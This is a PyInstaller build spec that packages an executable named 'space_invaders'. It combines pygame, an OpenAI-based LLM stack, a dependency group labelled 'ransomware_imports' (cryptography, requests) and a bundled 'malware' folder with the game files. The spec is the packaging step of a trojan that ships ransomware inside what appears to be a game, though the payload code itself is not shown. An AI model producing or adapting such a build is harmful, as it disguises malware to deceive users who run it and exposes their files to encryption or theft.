# -*- mode: python ; coding: utf-8 -*-

import os
from PyInstaller.utils.hooks import collect_submodules

block_cipher = None

pygame_imports = collect_submodules('pygame')
llm_imports = collect_submodules('openai') + collect_submodules('pyserde') + collect_submodules('typing_extensions') + collect_submodules('numpy')
ransomware_imports = collect_submodules('cryptography') + collect_submodules('requests')
hidden_imports = pygame_imports + llm_imports + ransomware_imports

a = Analysis(
    ['main.py'],
    pathex=[os.path.abspath('.')],
    binaries=[],
    datas=[('game/*', 'game'),('malware/*', 'malware')] if (os.path.isdir('game') or os.path.isdir('malware')) else [],
    hiddenimports=hidden_imports,
    hookspath=[],
    runtime_hooks=[],
    excludes=[],
    cipher=block_cipher,
)

pyz = PYZ(a.pure, a.zipped_data, cipher=block_cipher)

exe = EXE(
    pyz,
    a.scripts,
    a.binaries,
    a.datas,
    [],
    name='space_invaders',
    debug=False,
    bootloader_ignore_signals=False,
    strip=False,
    upx=True,
    upx_exclude=[],
    runtime_tmpdir=None,
    console=True,
    disable_windowed_traceback=False,
    argv_emulation=False,
    target_arch=None,
    codesign_identity=None,
    entitlements_file=None,
)
